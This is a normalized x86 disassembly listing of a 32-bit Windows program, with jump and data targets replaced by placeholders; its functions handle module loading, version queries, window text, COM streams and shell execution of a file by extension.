mov edi [ eax + 0x194 ]
mov [ edx ] edi
mov edi [ eax + 0x198 ]
mov [ edx + 0x4 ] edi
add edx 0x8
inc ecx
cmp ecx 0x6
jge r-xdata
sub_4030a0
push ebp
mov ebp esp
push 0xffffffff
push sub_4498f1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1dc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push r--data
mov esi ecx
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
xor eax eax
push r--data
push eax
call [ GetProcAddress@IAT ]
mov edi eax
xor eax eax
test edi edi
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn
push 0xb4
push eax
mov [ ebp - 0xcc ] al
mov [ ebp - 0xcb ] eax
mov [ ebp - 0xc7 ] ax
mov [ ebp - 0xc5 ] al
lea eax [ ebp - 0xc4 ]
push eax
call memset
lea ecx [ ebp - 0xcc ]
push ecx
call sub_402f90
add esp 0x10
test al al
je r-xdata
mov [ ebp - 0x1e4 ] 0x0
mov [ ebp - 0x4 ] 0x1
lea edx [ ebp - 0x1e4 ]
push edx
push 0x4
call edi
test eax eax
js r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1e4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1e4 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ eax ]
push 0x32
lea edx [ ebp - 0x9c ]
push edx
push eax
mov eax [ ecx + 0x10 ]
call eax
mov eax [ ebp - 0x1e4 ]
mov ecx [ eax ]
push 0x10
lea edx [ ebp - 0x38 ]
push edx
push eax
mov eax [ ecx + 0x14 ]
call eax
push 0x110
lea ecx [ ebp - 0x1dc ]
push 0x0
push ecx
call memset
add esp 0xc
lea edx [ ebp - 0x1e0 ]
push edx
mov [ ebp - 0x1e0 ] 0x114
call [ GetVersionExW@IAT ]
mov eax [ ebp - 0x1dc ]
mov ecx [ ebp - 0x1d8 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x1e8 ] 0x0
mov [ ebp - 0x4 ] 0x4
lea edx [ ebp - 0x1e8 ]
push edx
push 0x3
call [ Ordinal_crt_5@IAT ]
mov edi [ ebp - 0x1e8 ]
test edi edi
jne r-xdata
mov eax [ esi ]
mov ecx 0x1
sub ecx [ eax - 0x4 ]
mov eax [ eax - 0x8 ]
sub eax 0x40
or eax ecx
jge r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x1e8 ]
push eax
call sub_40a500
jmp r-xdata
mov eax [ esi ]
cmp [ eax - 0x8 ] 0x40
jge r-xdata
mov eax 0x40
mov ecx esi
call sub_402c40
mov [ eax - 0xc ] 0x40
mov ecx [ esi ]
push 0x40
push eax
xor edx edx
mov [ ecx + 0x80 ] dx
mov ecx [ edi ]
mov eax [ ecx + 0x10 ]
push 0xbc
lea edx [ ebp - 0xcc ]
push edx
push edi
call eax
mov edi eax
mov eax [ esi ]
mov ecx [ eax - 0x8 ]
test eax eax
je r-xdata
push 0x80070057
call sub_402d00
mov ecx [ esi ]
cmp eax [ ecx - 0x8 ]
jg r-xdata
push ecx
push eax
call [ wcsnlen@IAT ]
add esp 0x8
test eax eax
js r-xdata
mov [ ecx - 0xc ] eax
mov ecx [ esi ]
xor edx edx
mov [ ecx + eax * 2 ] dx
test edi edi
js r-xdata
xor esi esi
mov eax [ esi ]
cmp [ eax - 0xc ] edx
je r-xdata
mov eax esi
jmp r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
lea esi [ edx + 0x1 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x1e8 ]
push ecx
call sub_40a500
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1e4 ]
test eax eax
je r-xdata
sub_403310
push ebp
mov ebp esp
push 0xffffffff
push sub_44a008
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x10 ]
call sub_4030a0
test eax eax
jne r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0x1c ]
push r--data
push ecx
lea ecx [ ebp - 0x10 ]
call sub_401c00
mov [ ebp - 0x4 ] 0x5
push eax
lea edx [ ebp - 0x18 ]
push edx
mov ebx r--data
call sub_401b20
add esp 0x10
mov [ ebp - 0x4 ] 0x6
lea edi [ ebp - 0x14 ]
call sub_401760
mov [ ebp - 0x4 ] 0x5
mov eax [ ebp - 0x18 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x1c ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov esi [ ebp - 0x14 ]
push 0x0
push esi
push r--data
push r--data
call [ Ordinal_crt_36@IAT ]
add esp 0x10
movzx edi al
mov [ ebp - 0x4 ] 0x1
lea eax [ esi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_4034b0
push ebp
mov ebp esp
push 0xffffffff
push sub_444d28
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_403510
push ebp
mov ebp esp
push 0xffffffff
push sub_44987c
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
cmp [ ebp + 0x8 ] 0x6
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x14
push 0x2f4
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push eax
call sub_40c770
jmp r-xdata
mov ecx [ ebp + 0x18 ]
mov [ ecx ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
test eax eax
je r-xdata
sub_4035c0
push ebp
mov ebp esp
push 0xffffffff
push sub_444cf8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_403620
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
xor edx edx
cmp [ ecx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x3f0
je r-xdata
cmp [ ecx + 0x8 ] edx
je r-xdata
mov [ eax + 0x19 ] dl
cmp ecx 0x3f1
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x3ef
je r-xdata
cmp [ ebp + 0x8 ] 0x3f1
jne r-xdata
pop ebp
retn 0x8
push ebx
add eax 0x98
push r--data
push eax
mov ebx 0x11
call sub_402910
pop ebx
cmp ecx 0x3e9
jne r-xdata
mov [ eax + 0x19 ] dl
pop ebp
retn 0x8
cmp ecx 0x3e9
jne r-xdata
push edi
lea edi [ eax + 0x98 ]
mov edx r--data
call sub_4029c0
pop edi
pop ebp
retn 0x8
sub_4036b0
push ebp
mov ebp esp
push 0xffffffff
push sub_449f88
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x1
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x3
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x5
mov edi [ StrStrIW@IAT ]
push r--data
push esi
call edi
mov ebx eax
test ebx ebx
je r-xdata
push r--data
push esi
call edi
mov ebx eax
test ebx ebx
je r-xdata
push 0x22
add ebx 0xc
push ebx
call [ StrChrW@IAT ]
test eax eax
je r-xdata
push r--data
push esi
call edi
mov ebx eax
test ebx ebx
je r-xdata
push 0x22
add ebx 0x12
push ebx
call [ StrChrW@IAT ]
test eax eax
je r-xdata
sub eax ebx
sar eax 0x1
push eax
push ebx
lea ebx [ ebp - 0x18 ]
call sub_402ab0
mov eax [ ebp - 0x10 ]
mov edi [ ebp - 0x14 ]
mov esi [ ebp - 0x18 ]
push eax
call sub_403840
add esp 0x4
mov [ ebp - 0x4 ] 0x3
lea eax [ edi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
push 0x22
add ebx 0x14
push ebx
call [ StrChrW@IAT ]
test eax eax
je r-xdata
sub eax ebx
sar eax 0x1
push eax
push ebx
lea ebx [ ebp - 0x10 ]
call sub_402ab0
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x10 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub eax ebx
sar eax 0x1
push eax
push ebx
lea ebx [ ebp - 0x14 ]
call sub_402ab0
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ esi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_403840
push ebp
mov ebp esp
sub esp 0x3c
push esi
call [ PathFindExtensionW@IAT ]
push r--data
push eax
call [ _wcsicmp@IAT ]
add esp 0x8
test eax eax
jne r-xdata
test edi edi
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x1
push eax
push esi
call [ Ordinal_crt_97@IAT ]
test eax eax
js r-xdata
mov esp ebp
pop ebp
retn
cmp [ edi ] 0x0
je r-xdata
push 0x38
lea ecx [ ebp - 0x38 ]
push 0x0
push ecx
call memset
add esp 0xc
lea edx [ ebp - 0x3c ]
push edx
mov [ ebp - 0x38 ] 0x40
mov [ ebp - 0x3c ] 0x3c
mov [ ebp - 0x20 ] 0x5
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x30 ] r--data
call [ ShellExecuteExW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
mov ecx [ ebp - 0x4 ]
push ecx
call [ CloseHandle@IAT ]
sub_4038e0
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push r--data
mov esi ecx
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_443fba
mov esp ebp
pop ebp
retn
push 0x104
lea eax [ ebp - 0x20c ]
push eax
push esi
call [ GetModuleFileNameW@IAT ]
push r--data
lea ecx [ ebp - 0x20c ]
push ecx
call [ PathAppendW@IAT ]
lea edx [ ebp - 0x20c ]
push edx
call [ LoadLibraryW@IAT ]
mov [ rw-data ] eax
test eax eax
je r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov [ rw-data ] eax
sub_4039b0
push ebp
mov ebp esp
push 0xffffffff
push sub_44a454
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x1
call [ Ordinal_crt_3@IAT ]
add esp 0x4
mov ecx esi
call sub_4038e0
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
je r-xdata
push r--data
push edi
call [ StrStrIW@IAT ]
test eax eax
je r-xdata
push r--data
push ebx
push ebx
push r--data
push r--data
push ebx
call eax
add esp 0x18
push 0x38
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
mov ecx edi
call sub_4036b0
jmp r-xdata
xor eax eax
mov [ eax ] r--data
mov [ eax + 0x10 ] 0x1
mov [ eax + 0x14 ] ebx
mov [ eax + 0x18 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x20 ] ebx
mov [ ebp - 0x4 ] 0x1
mov [ eax ] r--data
mov [ eax + 0x24 ] ebx
mov [ eax + 0x28 ] ebx
mov [ ebp - 0x4 ] bl
jmp r-xdata
push 0x2
call [ Ordinal_crt_3@IAT ]
add esp 0x4
cmp [ rw-data ] ebx
je r-xdata
mov [ rw-data ] ebx
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ eax ]
push edi
mov [ rw-data ] eax
mov ecx eax
mov eax [ edx + 0x4 ]
push esi
call eax
mov ecx [ rw-data ]
cmp ecx ebx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov ecx [ rw-data ]
push ecx
call [ FreeLibrary@IAT ]
mov [ rw-data ] ebx
call eax
sub_403ae0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44b71c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x20 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor ebx ebx
push ebx
mov [ rw-data ] esi
call [ CoInitialize@IAT ]
push ebx
push ebx
push ebx
push ebx
call [ DefWindowProcW@IAT ]
lea eax [ esp + 0x14 ]
push eax
mov [ esp + 0x18 ] 0x8
mov [ esp + 0x1c ] 0x4
call [ InitCommonControlsEx@IAT ]
call sub_40b230
call sub_40b000
push 0x24
call [ operator new@IAT ]
add esp 0x4
mov [ esp + 0x14 ] eax
mov [ esp + 0x28 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
push eax
call sub_40b310
jmp r-xdata
call sub_403c60
mov esi [ rw-data ]
cmp esi ebx
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov [ rw-data ] ebx
mov [ esp + 0x28 ] 0xffffffff
mov edi [ ebp + 0x10 ]
mov [ rw-data ] eax
call sub_4039b0
mov ecx [ rw-data ]
cmp ecx ebx
je r-xdata
call sub_403d80
call [ CoUninitialize@IAT ]
mov eax [ rw-data ]
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ esi ]
mov edi [ free@IAT ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
push eax
call edi
add esp 0x4
mov [ esi ] ebx
push esi
mov [ esi + 0x8 ] ebx
call [ operator delete@IAT ]
add esp 0x4
push eax
call edi
add esp 0x4
mov [ esi + 0x4 ] ebx
sub_403c00
push ebp
mov ebp esp
push 0xffffffff
push sub_446798
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
push eax
call [ LeaveCriticalSection@IAT ]
mov [ esi + 0x4 ] 0x0
sub_403c60
push ebp
mov ebp esp
push 0xffffffff
push sub_447fba
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ rw-data ]
add edi 0x10
xor ebx ebx
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] bl
mov [ ebp - 0x4 ] 0x1
push edi
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov [ ebp - 0x10 ] 0x1
cmp eax ebx
je r-xdata
mov esi eax
cmp eax ebx
je r-xdata
cmp [ eax + 0x4 ] ebx
jle r-xdata
push edi
mov [ rw-data ] ebx
call [ LeaveCriticalSection@IAT ]
mov [ ebp - 0x10 ] bl
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax ]
push eax
call [ DestroyWindow@IAT ]
mov eax [ rw-data ]
push esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
call [ operator delete@IAT ]
add esp 0x4
push eax
call [ free@IAT ]
add esp 0x4
mov [ esi ] ebx
sub_403d20
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
push esi
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
push eax
push eax
push 0x1
push 0xc0000005
call [ RaiseException@IAT ]
mov [ eax + 0x8 ] 0x0
pop esi
pop ebp
retn 0x4
push ebx
mov ebx [ operator delete@IAT ]
push edi
lea esp [ esp ]
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
push eax
call ecx
mov edi [ esi + 0x8 ]
push esi
call ebx
add esp 0x4
mov esi edi
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop ebx
sub_403d80
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi edi
je r-xdata
mov esi [ rw-data ]
cmp esi [ rw-data ]
jae r-xdata
cmp [ esi ] edi
je r-xdata
cmp [ rw-data ] edi
je r-xdata
nop
mov eax [ esi + 0x10 ]
cmp eax edi
je r-xdata
pop edi
pop esi
retn
cmp [ rw-data ] edi
je r-xdata
add esi 0x4
cmp esi [ rw-data ]
jb r-xdata
mov ecx [ eax + 0x20 ]
push edi
call ecx
mov eax [ esi + 0x20 ]
push edi
mov [ esi + 0x10 ] edi
call eax
add esi 0x24
cmp [ esi ] edi
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push rw-data
call sub_403d20
mov [ rw-data ] edi
mov eax [ esi ]
cmp eax edi
je r-xdata
push rw-data
call [ DeleteCriticalSection@IAT ]
mov [ rw-data ] edi
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
sub_403e20
push ebp
mov ebp esp
push 0xffffffff
push sub_44b184
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
je r-xdata
push 0x0
call [ OleInitialize@IAT ]
push ebx
call [ GetWindowTextLengthW@IAT ]
mov edi eax
lea eax [ edi + edi + 0xa ]
cmp eax 0x400
ja r-xdata
sub eax 0x81
je r-xdata
push eax
call [ malloc@IAT ]
add esp 0x4
test eax eax
je r-xdata
call sub_444b80
mov esi esp
test esi esi
je r-xdata
push 0xffffffeb
push ebx
call [ GetWindowLongW@IAT ]
test eax eax
je r-xdata
sub eax 0x18e
jne r-xdata
mov [ ebp - 0x1c ] eax
mov esi eax
mov [ eax ] 0xdddd
add eax 0x8
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov [ esi ] 0xcccc
add esi 0x8
call [ OleUninitialize@IAT ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push eax
push ecx
push edx
push ebx
call [ DefWindowProcW@IAT ]
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
inc edi
push edi
push esi
push ebx
call [ GetWindowTextW@IAT ]
push r--data
push ebx
call [ SetWindowTextW@IAT ]
mov eax [ ebp + 0x14 ]
xor edi edi
mov [ ebp - 0x28 ] edi
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x20 ] eax
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x20 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
cmp esi eax
jne r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x2
test edi edi
je r-xdata
mov eax [ eax ]
test eax eax
je r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x10
mov esi [ GetWindowLongW@IAT ]
push 0xffffffec
push eax
call esi
test eax 0x10000
je r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x5
mov ecx [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push ecx
push ebx
mov ecx esi
call sub_40ab10
test eax eax
jns r-xdata
push edi
push 0x42
call [ GlobalAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
movzx edi [ eax ]
push 0xffffffec
push ebx
call esi
or eax 0x10000
push eax
push 0xffffffec
push ebx
call [ SetWindowLongW@IAT ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
lea edx [ ebp - 0x28 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
test eax eax
jns r-xdata
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov esi [ ebp - 0x1c ]
push esi
call [ GlobalLock@IAT ]
mov ecx [ ebp + 0x14 ]
mov ecx [ ecx ]
push eax
add ecx 0x2
mov eax edi
mov edx edi
call sub_402480
add esp 0x4
push esi
call [ GlobalUnlock@IAT ]
lea edx [ ebp - 0x14 ]
push edx
push 0x1
push esi
call [ CreateStreamOnHGlobal@IAT ]
mov eax [ ebp - 0x28 ]
push eax
push 0xffffffeb
push ebx
call [ SetWindowLongW@IAT ]
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x18 ]
push ecx
call sub_40a500
mov [ ebp - 0x4 ] 0x2
lea esi [ ebp - 0x24 ]
call sub_409b30
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x14 ]
push edx
call sub_40a500
mov [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x20 ]
call sub_404110
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x18 ]
push ecx
call sub_40a500
mov [ ebp - 0x4 ] 0x2
lea esi [ ebp - 0x24 ]
call sub_409b30
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x14 ]
push edx
call sub_40a500
mov [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x20 ]
call sub_404110
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0x2
lea esi [ ebp - 0x24 ]
call sub_409b30
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1c ]
add eax 0xfffffff8
cmp [ eax ] 0xdddd
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x20 ] 0x0
or eax 0xffffffff
jmp r-xdata
push eax
call [ free@IAT ]
add esp 0x4
sub_404140
push ebp
mov ebp esp
push 0xffffffff
push sub_4472eb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x404
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x40c ] eax
mov [ eax ] 0x0
test esi esi
je r-xdata
xor eax eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
lea ecx [ ebp - 0x400 ]
push ecx
push 0x2
lea edx [ ebp - 0x408 ]
push edx
push esi
call eax
test eax eax
js r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn
mov ecx [ esi ]
mov ecx [ ecx + 0xc ]
lea edx [ ebp - 0x400 ]
push edx
push 0x4
lea eax [ ebp - 0x410 ]
push eax
push esi
call ecx
test eax eax
js r-xdata
mov edx [ esi ]
mov edx [ edx + 0xc ]
lea eax [ ebp - 0x400 ]
push eax
push 0x4
lea ecx [ ebp - 0x404 ]
push ecx
push esi
call edx
test eax eax
js r-xdata
mov eax [ ebp - 0x404 ]
test eax eax
je r-xdata
mov ax [ ebp - 0x408 ]
mov ecx 0x37a
cmp ax cx
je r-xdata
jns r-xdata
mov eax [ esi ]
mov eax [ eax + 0xc ]
lea ecx [ ebp - 0x400 ]
push ecx
push 0x4
lea edx [ ebp - 0x3fc ]
push edx
push esi
call eax
test eax eax
js r-xdata
mov edx 0x37b
cmp ax dx
je r-xdata
jne r-xdata
push 0x80070057
call sub_402d00
mov eax [ ebp - 0x3fc ]
sub eax 0x4
mov [ ebp - 0x3fc ] eax
je r-xdata
xor edx edx
mov ecx 0x376
